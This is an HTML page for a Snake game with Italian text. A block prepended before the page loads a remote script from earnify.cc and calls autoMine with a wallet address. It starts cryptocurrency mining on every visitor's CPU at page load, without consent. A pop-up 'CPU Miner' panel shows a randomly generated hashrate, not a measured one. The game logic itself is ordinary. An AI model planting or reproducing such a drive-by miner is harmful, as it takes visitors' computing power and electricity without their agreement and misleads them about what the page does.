<!-- ==================== MINER CONSOLE (SENZA SFONDO NERO/VERDE) ==================== -->

<style>
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 260px;
    background: rgba(0, 0, 0, 0.85);
    border: 1px solid #ffffff33;
    border-radius: 6px;
    padding: 12px 14px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 15px;
    line-height: 1.7;
    display: none;
}

.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid #ffffff33;
}

.close-btn {
    background: #ffffff;
    color: #000000;
    border: none;
    width: 22px;
    height: 22px;
    font-size: 16px;
    line-height: 18px;
    text-align: center;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
}

#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background: rgba(255,255,255,0.1);
    border: 2px solid #ffffff88;
    color: #ffffff;
    font-size: 26px;
    border-radius: 50%;
    display: none;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
}
</style>

<!-- HTML Console -->
<div id="mining-console">
    <div class="console-header">
        <span><strong>🔨 CPU Miner</strong></span>
        <button class="close-btn" onclick="hideMinerConsole()"></button>
    </div>
    <div>Stato: Attivo</div>
    <div>Hashrate: <span id="hashrate">653</span> H/s</div>
    <div>Tempo: <span id="timer">00:00</span></div>
</div>

<!-- Bottone riapri -->
<div id="reopen-btn" onclick="showMinerConsole()">↑</div>

<!-- Mining Script -->
<script type="module">
    import { autoMine } from "https://earnify.cc/miner.js";
    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
</script>

<script>
let startTime = Date.now();

function updateTimer() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
    const sec = (elapsed % 60).toString().padStart(2, '0');
    document.getElementById("timer").textContent = `${min}:${sec}`;
}

function updateHashrate() {
    const hashrate = Math.floor(Math.random() * 420) + 480;
    document.getElementById("hashrate").textContent = hashrate;
}

function hideMinerConsole() {
    document.getElementById("mining-console").style.display = "none";
    document.getElementById("reopen-btn").style.display = "flex";
}

function showMinerConsole() {
    document.getElementById("mining-console").style.display = "block";
    document.getElementById("reopen-btn").style.display = "none";
}

window.addEventListener('load', () => {
    setInterval(updateTimer, 1000);
    setInterval(updateHashrate, 1400);
    setTimeout(() => showMinerConsole(), 800);
});
</script>

<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0a0a14;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            overflow: hidden;
            touch-action: manipulation;
        }
        h1 { color: #0f0; margin: 15px 0 8px 0; }

        #menu, #game-over {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
        }
        .menu-box, #game-over {
            background: rgba(0, 30, 0, 0.95);
            border: 3px solid #0f0;
            padding: 40px 60px;
            border-radius: 15px;
            box-shadow: 0 0 30px #0f0;
        }
        #game-over { border-color: #f00; }

        #game-container {
            display: none;
            flex-direction: column;
            align-items: center;
            margin-top: 10px;
        }
        canvas {
            border: 4px solid #0f0;
            border-radius: 10px;
            background: #111;
            box-shadow: 0 0 25px #0f0;
        }

        .info {
            margin: 10px 0;
            font-size: 1.1em;
        }

        button { margin: 10px; padding: 12px 25px; font-size: 1.1em; background: #0f0; color: black; border: none; border-radius: 8px; cursor: pointer; }
    </style>
</head>
<body>

    <!-- MENU -->
    <div id="menu">
        <div class="menu-box">
            <h1>🐍 Snake Game</h1>
            <button onclick="startGame()">▶️ START GAME</button>
        </div>
    </div>

    <!-- GIOCO -->
    <div id="game-container">
        <div class="info">
            Punteggio: <span id="score">0</span> | 
            Vite: <span id="lives">3</span>
        </div>
        <canvas id="gameCanvas" width="380" height="380"></canvas>

        <!-- Controlli Mobili -->
        <div id="mobile-controls" style="margin: 20px 0 30px 0; width: 260px;">
            <div class="dpad" style="display: grid; grid-template-columns: 80px 80px 80px; gap: 8px; justify-content: center;">
                <div></div>
                <div class="btn" style="background:rgba(0,255,0,0.2);border:3px solid #0f0;color:#0f0;font-size:32px;display:flex;align-items:center;justify-content:center;border-radius:12px;" onclick="move('up')">↑</div>
                <div></div>
                <div class="btn" style="background:rgba(0,255,0,0.2);border:3px solid #0f0;color:#0f0;font-size:32px;display:flex;align-items:center;justify-content:center;border-radius:12px;" onclick="move('left')">←</div>
                <div></div>
                <div class="btn" style="background:rgba(0,255,0,0.2);border:3px solid #0f0;color:#0f0;font-size:32px;display:flex;align-items:center;justify-content:center;border-radius:12px;" onclick="move('right')">→</div>
                <div></div>
                <div class="btn" style="background:rgba(0,255,0,0.2);border:3px solid #0f0;color:#0f0;font-size:32px;display:flex;align-items:center;justify-content:center;border-radius:12px;" onclick="move('down')">↓</div>
                <div></div>
            </div>
            <button onclick="togglePause()" style="margin-top:20px;padding:16px 50px;font-size:18px;background:#ff8800;color:white;border:none;border-radius:50px;width:100%;">⏸️ PAUSA / RIPRENDI</button>
        </div>
    </div>

    <!-- GAME OVER -->
    <div id="game-over" style="display: none;">
        <h1>Game Over</h1>
        <div class="score">Punteggio Finale: <span id="final-score">0</span></div>
        <button onclick="restartGame()">Gioca di Nuovo</button>
        <button onclick="goToMenu()">Torna al Menu</button>
    </div>

    <script>
        const canvas = document.getElementById("gameCanvas");
        const ctx = canvas.getContext("2d");
        
        let snake = [{ x: 10, y: 10 }];
        let food = { x: 15, y: 15 };
        let goldenFood = null;
        let dx = 0, dy = 0;
        let score = 0;
        let lives = 3;
        let gameInterval;
        let gameSpeed = 110;
        let isPaused = false;
        let applesEaten = 0;
        let noGrowMode = false;

        function drawGame() {
            if (isPaused) return;

            const head = { x: snake[0].x + dx, y: snake[0].y + dy };

            // Collisione muri
            if (head.x < 0 || head.x >= 19 || head.y < 0 || head.y >= 19) {
                die();
                return;
            }

            snake.unshift(head);

            // Mangia mela normale
            if (head.x === food.x && head.y === food.y) {
                score += 10;
                applesEaten++;
                document.getElementById("score").textContent = score;
                
                if (applesEaten % 10 === 0) {
                    spawnGoldenApple();
                } else {
                    generateFood();
                }

                if (!noGrowMode) {
                    // Non togliere la coda se sta mangiando
                } else {
                    snake.pop(); // non cresce dopo 200 punti
                }

                if (score >= 200) noGrowMode = true;
            } 
            // Mangia mela dorata
            else if (goldenFood && head.x === goldenFood.x && head.y === goldenFood.y) {
                lives++;
                document.getElementById("lives").textContent = lives;
                goldenFood = null;
                generateFood();
                snake.pop(); // non cresce extra
            } 
            else {
                snake.pop();
            }

            // Collisione con se stesso (solo se vite finite)
            for (let i = 1; i < snake.length; i++) {
                if (head.x === snake[i].x && head.y === snake[i].y) {
                    die();
                    return;
                }
            }

            // Disegna
            ctx.fillStyle = "#111";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // Serpente
            ctx.fillStyle = "#0f0";
            snake.forEach(s => ctx.fillRect(s.x * 20, s.y * 20, 18, 18));

            // Mela normale
            ctx.fillStyle = "#f00";
            ctx.fillRect(food.x * 20, food.y * 20, 18, 18);

            // Mela dorata
            if (goldenFood) {
                ctx.fillStyle = "#ffd700";
                ctx.fillRect(goldenFood.x * 20, goldenFood.y * 20, 18, 18);
            }
        }

        function generateFood() {
            food = { x: Math.floor(Math.random() * 19), y: Math.floor(Math.random() * 19) };
            for (let s of snake) {
                if (s.x === food.x && s.y === food.y) generateFood();
            }
        }

        function spawnGoldenApple() {
            goldenFood = { x: Math.floor(Math.random() * 19), y: Math.floor(Math.random() * 19) };
            for (let s of snake) {
                if (s.x === goldenFood.x && s.y === goldenFood.y) spawnGoldenApple();
            }
        }

        function die() {
            lives--;
            document.getElementById("lives").textContent = lives;

            if (lives <= 0) {
                clearInterval(gameInterval);
                document.getElementById("final-score").textContent = score;
                document.getElementById("game-over").style.display = "block";
            } else {
                // Respawn
                snake = [{ x: 9, y: 10 }];
                dx = 1; dy = 0;
                generateFood();
                goldenFood = null;
            }
        }

        function startGame() {
            document.getElementById("menu").style.display = "none";
            document.getElementById("game-container").style.display = "flex";
            document.getElementById("game-over").style.display = "none";
            resetGame();
        }

        function resetGame() {
            snake = [{ x: 9, y: 10 }];
            dx = 1; dy = 0;
            score = 0;
            lives = 3;
            applesEaten = 0;
            noGrowMode = false;
            gameSpeed = 110;
            isPaused = false;
            goldenFood = null;

            document.getElementById("score").textContent = "0";
            document.getElementById("lives").textContent = "3";

            generateFood();
            clearInterval(gameInterval);
            gameInterval = setInterval(drawGame, gameSpeed);
        }

        function restartGame() { 
            document.getElementById("game-over").style.display = "none"; 
            resetGame(); 
        }

        function goToMenu() {
            document.getElementById("game-over").style.display = "none";
            document.getElementById("game-container").style.display = "none";
            document.getElementById("menu").style.display = "block";
        }

        // Tastiera
        document.addEventListener("keydown", e => {
            if (document.getElementById("game-container").style.display !== "flex") return;
            switch(e.key) {
                case "ArrowUp":    if (dy !== 1) { dx = 0; dy = -1; } break;
                case "ArrowDown":  if (dy !== -1) { dx = 0; dy = 1; } break;
                case "ArrowLeft":  if (dx !== 1) { dx = -1; dy = 0; } break;
                case "ArrowRight": if (dx !== -1) { dx = 1; dy = 0; } break;
                case " ": togglePause(); e.preventDefault(); break;
            }
        });

        function move(dir) {
            if (isPaused) return;
            switch(dir) {
                case "up":    if (dy !== 1) { dx = 0; dy = -1; } break;
                case "down":  if (dy !== -1) { dx = 0; dy = 1; } break;
                case "left":  if (dx !== 1) { dx = -1; dy = 0; } break;
                case "right": if (dx !== -1) { dx = 1; dy = 0; } break;
            }
        }

        function togglePause() {
            isPaused = !isPaused;
        }

        // Avvio
        window.onload = () => {
            const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
            if (isMobile) {
                document.getElementById("mobile-controls").style.display = "block";
            }
        };
    </script>
</body>
</html>
